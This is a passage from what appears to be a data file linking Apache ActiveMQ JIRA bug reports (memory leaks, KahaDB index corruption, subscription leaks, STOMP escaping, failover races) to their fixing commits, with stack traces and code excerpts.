	at org.apache.kahadb.index.ListNode.access$500(ListNode.java:37)
	at org.apache.kahadb.index.ListNode$ListIterator.remove(ListNode.java:227)
	at org.apache.activemq.store.kahadb.plist.PList$PListIterator$1.execute(PList.java:229)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:771)
	at org.apache.activemq.store.kahadb.plist.PList$PListIterator.remove(PList.java:226)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor$DiskIterator.remove(FilePendingMessageCursor.java:517)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.remove(FilePendingMessageCursor.java:321)
	at org.apache.activemq.broker.region.Queue.doPageInForDispatch(Queue.java:1735)
	at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1948)
	at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1465)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:680)
{code}",c73027da1af8a36b8a01a82a87c64a874729a3b4,"https://issues.apache.org/jira/browse/AMQ-4221 - fix dangling reference to free page

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1421373 13f79535-47bb-0310-9956-ffa450edef68"
12618563,AMQ-4201,<NA>,dcbb19509435703ebb16e1da65a8029206fbbe66,"Fixes AMQ-4201 : JMSX* properties not included in the getPropertyNames() enumeration

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1416515 13f79535-47bb-0310-9956-ffa450edef68"
12618151,AMQ-4196,"n a broker network like this: A <--> B <---> C

Scenario:

A producer to BrokerA creates a message, sets its replyTo header to a temp destination that it creates and listens on, then sends the message off to broker A. The message is demand forwarded to BrokerC because there is a consumer there that consumes the message and replies to the temp dest in the replyTo header.

As the number of concurrent producers on BrokerA sending these messages increases, the subscription to the temp destination that was demand forwarded will not be cleaned up properly on BrokerC. The reason for this is the DemandForwardingBridge runs the remove consumer code in a separate thread. But if a ""remove destination"" advisory messages comes in, it will remove the destination from the AdvisoryBroker's destination map. So if this happens before the code for removeConsumer runs (in AdvisoryBroker), then the destination will not be in the destination map and the advisory for removeConsumer will not fire.

The net result is a subscription leak in the network bridge on B & C

The junit test shows two issues:

1) the subscriptions leaked when concurrent producers using request/reply and correctly closing the consumer and connection
2) all subscriptions leaked when using a single producer with request/reply and closing only the connection, and not the consumer explicitly

Issue 2 is related to temp destinations only and is compounded by 
https://issues.apache.org/jira/browse/AMQ-3879",fc706d074ae7992ff91cb1c428ed46662c6e6ab5,"https://issues.apache.org/jira/browse/AMQ-4196 - Christian nice test

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1415409 13f79535-47bb-0310-9956-ffa450edef68"
12616950,AMQ-4182,"InflaterInputStream is supposed to close explicitly to release resource allocated by its JNI methods. In ActiveMQBytesMessage, dataIn property is disposed simply without closing it, which results in some weird memory leak that can't be detected from heap size. It can't be controlled by -Xmx or -XX:MaxDirectMemorySize.

Please run the following test program to verify the issue:

import java.util.concurrent.TimeUnit;

import javax.jms.BytesMessage;
import javax.jms.Connection;
import javax.jms.Session;

import org.apache.activemq.ActiveMQConnectionFactory;
import org.apache.activemq.command.ActiveMQBytesMessage;

/**
 * A simple test to verify memory leak in ActiveMQBytesMessage.
 */
public class Main
{
    public static void main(String[] args) throws Exception 
    {
        ActiveMQConnectionFactory connFactory = new ActiveMQConnectionFactory(""vm://localhost"");
        connFactory.setUseCompression(true);
        Connection conn = connFactory.createConnection();
        Session session = conn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        BytesMessage message = session.createBytesMessage();
        
        message.writeBytes(new byte[1024]);

        ActiveMQBytesMessage m = (ActiveMQBytesMessage)message;
        if(!m.isCompressed())
        {
            throw new RuntimeException();
        }
        
        
        while (true)
        {
            for (int k = 0; k < 1024; ++k)
            {
                message.reset();
                byte[] data = new byte[1024];
                message.readBytes(data);
            }
            TimeUnit.MILLISECONDS.sleep(10);
        }
    }

}",c899492af8205ac007a9295608d3af77615eb75c,"some fixes for: https://issues.apache.org/jira/browse/AMQ-4182

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1413703 13f79535-47bb-0310-9956-ffa450edef68"
12616921,AMQ-4181,"When the number of messages in the queue is larger than set page size, the jms queue browser will get one page size of messages (200 by default).

Ideally we'd want to send all the messages or at least until we reach the memory limit set for the queue/broker.
",5bfbc542b1349895dff5a52408302c59323f6aa4,"https://issues.apache.org/jira/browse/AMQ-4181 - remove the browser imidiatelly when finished

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1417331 13f79535-47bb-0310-9956-ffa450edef68"
12616048,AMQ-4172,"see results of some 5.8-SNAPSNOT verification

https://issues.apache.org/jira/browse/AMQ-4166?focusedCommentId=13497034&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-13497034

seems spring and core modules need to be included in the rar.",76963e6adfdae0c74ebbb1150018067104b7d70e,"some work for: https://issues.apache.org/jira/browse/AMQ-4172

Adds activemq-spring into the rar.

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1418364 13f79535-47bb-0310-9956-ffa450edef68"
12614093,AMQ-4147,"Symptom
=======
I was writing some unit tests based on {{org.apache.activemq.JmsMultipleBrokersTestSupport}}, and noticed the following issue:

When brokers are connected in a network using VMTransport (i.e., VMTransport on both the local and remote ends of a bridge), and a message moves from broker1 to broker2, the memory usage of the message continues to be accounted for on broker1 until the message is actually consumed on broker2.  

If the brokers are bridged using a non-VM transport (e.g., TCP), memory usage on broker1 is reduced as soon as the message is bridged to broker2, and broker2's memory usage increases until the message is consumed.

Cause
=====
The cause is the same as in AMQ-4116: {{Message.copy()}} copies the {{memoryUsage}} object.  As a result, when the message moves from broker1 to broker2, the original {{memoryUsage}} object, which refers to broker1 is copied through to broker2 and never updated to broker2's {{memoryUsage}} object.

Specifically, the message is copied from the local transport before being sent to the remote transport by this code:

{code:title=DemandForwardingBridgeSupport.java}
protected void serviceLocalCommand(Command command) {
    if (!disposed.get()) {
        try {
            if (command.isMessageDispatch()) {
                enqueueCounter.incrementAndGet();
                final MessageDispatch md = (MessageDispatch) command;
                final DemandSubscription sub = subscriptionMapByLocalId.get(md.getConsumerId());
                if (sub != null && md.getMessage() != null && sub.incrementOutstandingResponses()) {

                    if (suppressMessageDispatch(md, sub)) {
                        if (LOG.isDebugEnabled()) {
                            LOG.debug(configuration.getBrokerName() + "" message not forwarded to "" + remoteBrokerName + "" because message came from there or fails networkTTL, brokerPath: "" + Arrays.toString(md.getMessage().getBrokerPath()) + "", message: "" + md.getMessage());
                        }
                        // still ack as it may be durable
                        try {
                            localBroker.oneway(new MessageAck(md, MessageAck.INDIVIDUAL_ACK_TYPE, 1));
                        } finally {
                            sub.decrementOutstandingResponses();
                        }
                        return;
                    }

                    Message message = configureMessage(md);
...

protected Message configureMessage(MessageDispatch md) {
    Message message = md.getMessage().copy();
...

{code}

This bug is not present when a non-VM transport is used for the bridge because {{Message.memoryUsage}} is marked transient *not* copied during serialization/deserialization over the transport.

Solution
========
Since this is at least the second bug to result from the current {{Message.copy()}} behaviour, I think ""Solution 1"" proposed from AMQ-4116 is starting to look attractive as both a solution to AMQ-4116 and this bug:

Modify {{Message.copy()}} so that it sets the resulting message's {{memoryUsage}} object to {{null}}.  This would make {{Message.copy()}} behave more similarly to serialization/deserialization.

",972176ea332be5da2f8af1c16eff84fe411e087d,"Add a fix for: https://issues.apache.org/jira/browse/AMQ-4147

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1441240 13f79535-47bb-0310-9956-ffa450edef68"
12614039,AMQ-4145,"In the TcpTransportServer#handleSocket method, we see that the default values for certain options (among them, trace, maxInactivityDuration, soTimeout, etc) are converted to their wrapper equivalents. 

However in IntrospectionSupport#convert(Object value, Class to) the conversion is not done properly. It always throws the IllegalArgumentException. 

Found in this message trail, although can be seen in other attempts to set variables directly on the transport server.

Possibly related to changes for AMQ-3797 ??",f7c799309dd0cac696b966aac2ab4e2a122da1b3,"https://issues.apache.org/jira/browse/AMQ-4145 IntrospectionSupport does not convert from primitive to Wrapper classes appropriately

Added two tests to show the conversion was not happening properly, and added an identity converter to the TypeConversionSupport to do a pass-through conversion on types that are the same after a primitive to wrapper class conversion

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1404165 13f79535-47bb-0310-9956-ffa450edef68"
12613792,AMQ-4140,"Hi,

I am using ActiveMQ and have some integration tests leveraging the maven-activemq-plugin.

I have found that:

1. path to XBean files are not resolved properly, as:
- the path is relative, and therefore, multi-module builds fail;
- at least under Windows, the generated path is not a valid URL, hence the plugin fails on this call: final BrokerService broker = BrokerFactory.createBroker(configUri);

2. unlike other Maven plugins, maven-activemq-plugin doesn't follow the convention of having a skip flag, to skip execution under some circumstances. This is not a bug, but rather an improvement that would make users' life easier IMO (and at least, mine).

In the attachments, I have provided:
- a multi-module build that would allow you to easily and systematically replicate the above two issues: maven-activemq-plugin-user-acceptance-test.zip
- a ""fixed"" version of maven-activemq-plugin, based on trunk / 5.8-SNAPSHOT (as of 2012/10/28 06:34 BST): maven-activemq-plugin.zip
- a patch, containing the equivalent fix, in case this format is preferred: maven-activemq-plugin.patch

I hope this will help to have this resolved in a 5.7.1 or 5.8 version of the plugin very soon? :-)

Cheers,

M.

P.S. : In case you need committers, I would be happy to occasionally help.
(I noticed the documentation for this plugin is rather outdated, so could help with that at least)",f6a5c7bd470ef4b10aaf6cd43f3bec9760f5a4b2,"apply patch for: https://issues.apache.org/jira/browse/AMQ-4140

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1404116 13f79535-47bb-0310-9956-ffa450edef68"
12612994,AMQ-4122,"We are using ActiveMQ 5.7.0 together with a mysql database and could not observe correct failover behavior with lease database locker.
It seems that there is a race condition, which prevents the correct failover procedure.
We noticed that when starting up two instances, both instance are becoming master.

We did several test, including the following and could not observe intended functionality:
- shutdown all instances
- manipulate database lock that one node has lock and set expiry time in distance future
- start up both instances. both instances are unable to acquire lock, as the lock hasn't expired, which should be correct behavior.
- update the expiry time in database, so that the lock is expired.
- first instance notices expired lock and becomes master
- when second instance checks for lock, it also updates the database and becomes master.

To my understanding the second instance should not be able to update the lock, as it is held by the first instance and should not be able to become master.",ef1d254e34a5f32f9f46161bf45020c48f555cdd,"AMQ-4122 - add log warning if lease will expire due to mal configuration

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1450213 13f79535-47bb-0310-9956-ffa450edef68"
12612791,AMQ-4118,"An overflowed chain is release when it is no longer needed, but the new end page was not stored in the cache, the old value as a part page is reused and freed again. boom. Keeping the cache in sync sorts this.
A workaround is to disable the index page cache with a small indexCacheSize.
Durable subs make this more visible, but the failure symptoms vary with usage. A typical scenario is a classcast when the page is reused in the wrong context or a npe when the free page is loaded from disk.
With durable subs with selectors and large backlogs, the sequence set expansion and shrinkage produces values that can overflow easily. This scenario produced a nice test.

Some resultant stack traces that are symptomatic:
{code}2012-10-19 22:25:11,928 [exPageUsage#5-2] - ERROR MessageDatabase                - KahaDB failed to store to Journal
java.io.EOFException: Chunk stream does not exist, page: 1344 is marked free
	at org.apache.kahadb.page.Transaction$2.readPage(Transaction.java:481)
	at org.apache.kahadb.page.Transaction$2.<init>(Transaction.java:458)
	at org.apache.kahadb.page.Transaction.openInputStream(Transaction.java:455)
	at org.apache.kahadb.page.Transaction.load(Transaction.java:431)
	at org.apache.kahadb.page.Transaction.load(Transaction.java:388)
	at org.apache.kahadb.index.BTreeIndex.loadNode(BTreeIndex.java:262)
	at org.apache.kahadb.index.BTreeNode.getChild(BTreeNode.java:225)
	at org.apache.kahadb.index.BTreeNode.getLeafNode(BTreeNode.java:680)
	at org.apache.kahadb.index.BTreeNode.get(BTreeNode.java:562)
	at org.apache.kahadb.index.BTreeIndex.get(BTreeIndex.java:184)
	at org.apache.activemq.store.kahadb.MessageDatabase$MessageOrderIndex.get(MessageDatabase.java:2616)
	at org.apache.activemq.store.kahadb.MessageDatabase.updateIndex(MessageDatabase.java:1210)
	at org.apache.activemq.store.kahadb.MessageDatabase$15.execute(MessageDatabase.java:1002)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:790)
	at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:1000)
	at org.apache.activemq.store.kahadb.MessageDatabase$13.visit(MessageDatabase.java:933)
	at org.apache.activemq.store.kahadb.data.KahaRemoveMessageCommand.visit(KahaRemoveMessageCommand.java:220)
	at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:925)
	at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:837)
	at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:819)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBTopicMessageStore.doAcknowledge(KahaDBStore.java:723)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBTopicMessageStore.acknowledge(KahaDBStore.java:706)
	at org.apache.activemq.store.kahadb.KahaDBTransactionStore.acknowledge(KahaDBTransactionStore.java:519)
	at org.apache.activemq.store.kahadb.KahaDBTransactionStore$2.acknowledge(KahaDBTransactionStore.java:222)
	at org.apache.activemq.broker.region.Topic.acknowledge(Topic.java:528)
	at org.apache.activemq.broker.region.DurableTopicSubscription.acknowledge(DurableTopicSubscription.java:279)
	at ..{code}
{code}java.lang.ClassCastException: java.lang.Long cannot be cast to java.lang.String
        at java.lang.String.compareTo(String.java:92)
        at java.util.Arrays.binarySearch0(Arrays.java:2001)
        at java.util.Arrays.binarySearch(Arrays.java:1943)
        at org.apache.kahadb.index.BTreeNode.put(BTreeNode.java:371)
        at org.apache.kahadb.index.BTreeNode.put(BTreeNode.java:369)       
        at org.apache.kahadb.index.BTreeIndex.put(BTreeIndex.java:189)        
at org.apache.activemq.store.kahadb.MessageDatabase$MessageOrderIndex.put(MessageDatabase.java:2592)
        at org.apache.activemq.store.kahadb.MessageDatabase.upadateIndex(MessageDatabase.java:1168)        at org.apache.activemq.store.kahadb.MessageDatabase$AddOpperation.execute(MessageDatabase.java:2082)        at org.apache.activemq.store.kahadb.MessageDatabase$18.execute(MessageDatabase.java:1095)        at org.apache.kahadb.page.Transaction.execute(Transaction.java:768)
        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:1092)
        at org.apache.activemq.store.kahadb.MessageDatabase$13.visit(MessageDatabase.java:961)
        at org.apache.activemq.store.kahadb.data.KahaCommitCommand.visit(KahaCommitCommand.java:130)
        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:943)
        at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:855)
        at org.apache.activemq.store.kahadb.KahaDBTransactionStore.commit(KahaDBTransactionStore.java:267)
        at org.apache.activemq.transaction.XATransaction.storeCommit(XATransaction.java:85)
...{code}
{code}java.lang.NullPointerException
        at org.apache.kahadb.index.BTreeIndex.loadNode(BTreeIndex.java:264)
        at org.apache.kahadb.index.BTreeNode.getChild(BTreeNode.java:225)
        at org.apache.kahadb.index.BTreeNode.getLeafNode(BTreeNode.java:676)
        at org.apache.kahadb.index.BTreeNode.put(BTreeNode.java:369)
        at org.apache.kahadb.index.BTreeIndex.put(BTreeIndex.java:189)
        at org.apache.activemq.store.kahadb.MessageDatabase$MessageOrderIndex.put(MessageDatabase.java:2592)
        at org.apache.activemq.store.kahadb.MessageDatabase.upadateIndex(MessageDatabase.java:1168)
        at org.apache.activemq.store.kahadb.MessageDatabase$AddOpperation.execute(MessageDatabase.java:2082)
        at org.apache.activemq.store.kahadb.MessageDatabase$18.execute(MessageDatabase.java:1095)
        at org.apache.kahadb.page.Transaction.execute(Transaction.java:768)
        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:1092)
        at org.apache.activemq.store.kahadb.MessageDatabase$13.visit(MessageDatabase.java:961)
        at org.apache.activemq.store.kahadb.data.KahaCommitCommand.visit(KahaCommitCommand.java:130)
        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:943)
        at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:855)
        at org.apache.activemq.store.kahadb.KahaDBTransactionStore.commit(KahaDBTransactionStore.java:267){code}",4cf6151a8c10079d89969cef8c115fce52623a81,"https://issues.apache.org/jira/browse/AMQ-4118 - resolve with test. keep cache uptodate when overflow chain is released so new end page is visible as terminus

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1400317 13f79535-47bb-0310-9956-ffa450edef68"
12612520,AMQ-4116,"Reproduction
============
Using VMTransport:

1. Produce a message on queue A and verify that queue A's memory usage increases
2. Consume the message from queue A and verify that queue A's memory usage decreases.
3. Resend the message to queue B.

Expected: Queue A's memory usage is not increased by the enqueue to queue B.
Actual: Queue A's memory usage increases and no memory usage increase occurs on queue B.

Symptom
=======
When messages are moved between queues using the VMTransport, they continue to contribute to the memory usage of the source queue rather than the destination queue.

The correct behaviour (memory usage decreases from queue A and increases in queue B) is exhibited by non-VMTransport (e.g., TCP).

Cause
=====
When the message is first sent to queue A, it's memoryUsage field is set to match queue A's:

{code:title=org.apache.activemq.broker.region.Queue}
public void send(final ProducerBrokerExchange producerExchange, final Message message) throws Exception {
    final ConnectionContext context = producerExchange.getConnectionContext();
    // There is delay between the client sending it and it arriving at the
    // destination.. it may have expired.
    message.setRegionDestination(this);
...
{code}

{code:title=org.apache.activemq.command.Message}
public void setRegionDestination(org.apache.activemq.broker.region.Destination destination) {
    this.regionDestination = destination;
    if(this.memoryUsage==null) {
        this.memoryUsage=regionDestination.getMemoryUsage();
    }
}
{code}

As the message moves across the transport, it is copied along with the memoryUsage field:

{code:title=org.apache.activemq.command.Message}
protected void copy(Message copy) {
    super.copy(copy);
...
    copy.memoryUsage=this.memoryUsage;
...
{code}

When the message is sent to the second queue, memoryUsage is non-null, so setRegionDestination(...) does not update memoryUsage to reflect the new destination queue.

When the destination queue accepts the message, the memoryUsage of the source queue is (incorrectly) increased:

{code:title=org.apache.activemq.command.Message}
public int incrementReferenceCount() {
    int rc;
    int size;
    synchronized (this) {
        rc = ++referenceCount;
        size = getSize();
    }

    if (rc == 1 && getMemoryUsage() != null) {
        getMemoryUsage().increaseUsage(size);
{code}

This mal-behaviour is not exhibited by other transports since they serialize Message and memoryUsage is transient.  As a result, the call to setRegionDestination(...) will properly update memoryUsage when the message arrives at the destination queue.

Solution
========
There are a number of possible solutions, any of which would correct the behaviour (although I am unsure what side-effects they may have on other behaviour):

1. It seems odd that memoryUsage is copied when Message is copied.  If Message.copy(...) is used as a shortcut to avoid serialization/deserialization on VMTransport, then it should have the same semantics and avoid copying transient fields.

2. It seems odd that setRegionDestination(...) would not always set the memoryUsage to match the destination's memoryUsage.

3. ActiveMQConnection has a comment regarding concessions made for messages transmitted by the VM transport:

{code:title=org.apache.activemq.ActiveMQConnection}
public void onCommand(final Object o) {
    final Command command = (Command)o;
    if (!closed.get() && command != null) {
        try {
            command.visit(new CommandVisitorAdapter() {
                @Override
                public Response processMessageDispatch(MessageDispatch md) throws Exception {
                    waitForTransportInterruptionProcessingToComplete();
                    ActiveMQDispatcher dispatcher = dispatchers.get(md.getConsumerId());
                    if (dispatcher != null) {
                        // Copy in case a embedded broker is dispatching via
                        // vm://
                        // md.getMessage() == null to signal end of queue
                        // browse.
                        Message msg = md.getMessage();
                        if (msg != null) {
                            msg = msg.copy();
                            msg.setReadOnlyBody(true);
                            msg.setReadOnlyProperties(true);
                            msg.setRedeliveryCounter(md.getRedeliveryCounter());
                            msg.setConnection(ActiveMQConnection.this);
                            md.setMessage(msg);
                        }
                        dispatcher.dispatch(md);
                    }
                    return null;
                }
{code}

Adding a call to msg.setMemoryUsage(null) would address this bug.

The latter appears to be the least intrusive, although it will only address the case of VMTransport messages moving between producers/consumers. Queue contains shortcut methods for moving messages between queues (e.g., copyMessageTo).  I have not verified if these methods exhibit the same behaviour re: memory usage, but if so, they would not be addressed by patching ActiveMQConnection.

Our main concern is with the reported use case, so I've attached a patch for ActiveMQConnection and unit test to demonstrate the behaviour.",849baa6fbcfaab64de494888f5cf9e4346d15c05,"Apply fix and test for: https://issues.apache.org/jira/browse/AMQ-4116

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1441212 13f79535-47bb-0310-9956-ffa450edef68"
12611702,AMQ-4104,"The STOMP 1.1 specification says:

All frames except the CONNECT and CONNECTED frames will also escape any colon or newline octets found in the resulting UTF-8 encoded headers. ...... The CONNECT and CONNECTED frames do not escape the colon or newline octets in order to remain backward compatible with STOMP 1.0.

AMQ 5.7.0 is out of specification with regard to this.

Example telnet session:

$ telnet tjjackson 61613
Trying 192.168.1.200...
Connected to tjjackson.
Escape character is '^]'.
CONNECT
login:me
passcode:asdasd
accept-version:1.1
host:tjjackson
heart-beat:10000,15000

^@
CONNECTED
heart-beat:15000,10000
session:ID\ctjjackson-55318-1350137693500-2\c1
server:ActiveMQ/5.7.0
version:1.1
",e9bf83fc92d9fcfb9bf01e5daa1dbeb378a9c8fe,"Fix for: https://issues.apache.org/jira/browse/AMQ-4104

Add the unit test for this

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1398838 13f79535-47bb-0310-9956-ffa450edef68"
12610936,AMQ-4098,"See nabble
http://activemq.2283324.n4.nabble.com/ActiveMQ-5-7-0-startup-error-broker-ks-missing-tp4657622.html;cid=1349764415189-189

",07ade0db8f478b37c2950555364ddf9efba86d2c,"AMQ-4098: Added missing binary files to the assembly. The files was needed for activemq-demo.xml etc.

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1395931 13f79535-47bb-0310-9956-ffa450edef68"
12610936,AMQ-4098,"See nabble
http://activemq.2283324.n4.nabble.com/ActiveMQ-5-7-0-startup-error-broker-ks-missing-tp4657622.html;cid=1349764415189-189

",d84fe0b0f5db1bd7af6c5b0754385c70a013a1e8,"additional fix for: https://issues.apache.org/jira/browse/AMQ-4098

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1396644 13f79535-47bb-0310-9956-ffa450edef68"
12610936,AMQ-4098,"See nabble
http://activemq.2283324.n4.nabble.com/ActiveMQ-5-7-0-startup-error-broker-ks-missing-tp4657622.html;cid=1349764415189-189

",61ff5702612ca998a5cfa52e50e7c33b781f628b,"https://issues.apache.org/jira/browse/AMQ-4098 - fix favicon for web apps

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1497375 13f79535-47bb-0310-9956-ffa450edef68"
12610178,AMQ-4092,"seeing these WARN messages frequently while consuming (maxConcurrentConsumers=5) from a queue with the message groups header (JMSXGroupID) set.  If I disable the message groups header, these errors go away...  

That said, I don't see any specific errors with my application (at this point), just these messages in my logs.

2012-10-04 02:34:02,552 |  WARN - Service              - | Async error occurred: java.util.concurrent.ExecutionException: java.util.ConcurrentModificationException
java.util.concurrent.ExecutionException: java.util.ConcurrentModificationException
	at java.util.concurrent.FutureTask$Sync.innerGet(FutureTask.java:222)
	at java.util.concurrent.FutureTask.get(FutureTask.java:83)
	at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:785)
	at org.apache.activemq.broker.region.Queue.send(Queue.java:707)
	at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:407)
	at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:503)
	at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:305)
	at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)
	at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)
	at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:306)
	at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)
	at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:453)
	at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:681)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:150)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:231)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:680)
Caused by: java.util.ConcurrentModificationException
	at java.util.HashMap$HashIterator.nextEntry(HashMap.java:793)
	at java.util.HashMap$KeyIterator.next(HashMap.java:828)
	at org.apache.activemq.util.MarshallingSupport.marshalPrimitiveMap(MarshallingSupport.java:64)
	at org.apache.activemq.command.Message.beforeMarshall(Message.java:210)
	at org.apache.activemq.command.ActiveMQObjectMessage.beforeMarshall(ActiveMQObjectMessage.java:199)
	at org.apache.activemq.openwire.v6.MessageMarshaller.looseMarshal(MessageMarshaller.java:277)
	at org.apache.activemq.openwire.v6.ActiveMQMessageMarshaller.looseMarshal(ActiveMQMessageMarshaller.java:111)
	at org.apache.activemq.openwire.v6.ActiveMQObjectMessageMarshaller.looseMarshal(ActiveMQObjectMessageMarshaller.java:111)
	at org.apache.activemq.openwire.OpenWireFormat.marshal(OpenWireFormat.java:168)
	at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.addMessage(KahaDBStore.java:429)
	at org.apache.activemq.store.kahadb.KahaDBStore$StoreQueueTask.run(KahaDBStore.java:1177)
	... 3 more
",25e6b9920b3f1793c496f40d0de50009b76097ad,https://issues.apache.org/jira/browse/AMQ-4092 - add unit test that reproduced
12609193,AMQ-4081,In the assembly we should include the webapps/favicon.ico as a binary file.,9583d9af9f5fab8d0dbc1d78c68cc93e01d0e8b0,"AMQ-4081: favicon should be handled as binary file in assembly

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1390323 13f79535-47bb-0310-9956-ffa450edef68"
12607223,AMQ-4047,"Installing activemq-optional, do not include all the JARs it needs. eg in the pom.xml file we got a number of JARs which isn't installed.",f653fbfe14c212851c27f50bb06adbd7e4d46669,"AMQ-4047: activemq-option feature included needed JARs

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1386535 13f79535-47bb-0310-9956-ffa450edef68"
12605217,AMQ-4000,"In a network of two brokers, a durable subscription is correctly propagated across to the remote broker. However when the consumer unsubscribes from the durable subscription again, it is only removed on the local broker but not on the remote broker. The remote broker keeps its durable subscription alive.

As a consequence messages sent to the topic destination on the remote broker for which the durable subscriptions existed, are passed on to the local broker, although there is no active subscription on the local broker. The local broker will discard these msgs but unnecessary traffic has already occurred on the network bridge.",0061f6f75538ede8fe3443925e64beb839abfb90,"https://issues.apache.org/jira/browse/AMQ-4000 - tracking subscription commands causes a problem with replay outside of activate - can reset a sub ack locations - regression in AMQ2149Test. Fixed by ignoring sub add during recovery replay

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1511306 13f79535-47bb-0310-9956-ffa450edef68"
12605205,AMQ-3999,"
Here is the stack trace showing the thread that is making the call to the getMessageCount when a sub is unsubscribing. This causes unnecessary contention with message addition and can result is pauses. Is it really necessary?

{code}ActiveMQ Transport: tcp:///127.0.0.1:54115
sun.misc.Unsafe.park at line #-2
java.util.concurrent.locks.LockSupport.park at line #186
java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt at line #834
java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued at line #867
java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire at line #1197
java.util.concurrent.locks.ReentrantReadWriteLock$WriteLock.lock at line #945
org.apache.activemq.store.kahadb.KahaDBStore$KahaDBTopicMessageStore.getMessageCount at line #782
org.apache.activemq.store.ProxyTopicMessageStore.getMessageCount at line #116
org.apache.activemq.broker.region.cursors.TopicStorePrefetch.getStoreSize at line #83
org.apache.activemq.broker.region.cursors.AbstractStoreCursor.resetSize at line #66
org.apache.activemq.broker.region.cursors.AbstractStoreCursor.gc at line #246
org.apache.activemq.broker.region.cursors.StoreDurableSubscriberCursor.stop at line #98
org.apache.activemq.broker.region.DurableTopicSubscription.deactivate at line #171
org.apache.activemq.broker.region.TopicRegion.removeConsumer at line #164
org.apache.activemq.broker.region.RegionBroker.removeConsumer at line #473
org.apache.activemq.broker.jmx.ManagedRegionBroker.removeConsumer at line #266
org.apache.activemq.broker.BrokerFilter.removeConsumer at line #117
org.apache.activemq.broker.BrokerFilter.removeConsumer at line #117
org.apache.activemq.broker.MutableBrokerFilter.removeConsumer at line #123
org.apache.activemq.broker.TransportConnection.processRemoveConsumer at line #580
org.apache.activemq.broker.TransportConnection.processRemoveSession at line #617
org.apache.activemq.command.RemoveInfo.visit at line #74
org.apache.activemq.broker.TransportConnection.service at line #291
org.apache.activemq.broker.TransportConnection$1.onCommand at line #149
org.apache.activemq.transport.MutexTransport.onCommand at line #50
org.apache.activemq.transport.WireFormatNegotiator.onCommand at line #113
org.apache.activemq.transport.AbstractInactivityMonitor.onCommand at line #229
org.apache.activemq.transport.TransportSupport.doConsume at line #83
org.apache.activemq.transport.tcp.TcpTransport.doRun at line #215
org.apache.activemq.transport.tcp.TcpTransport.run at line #197
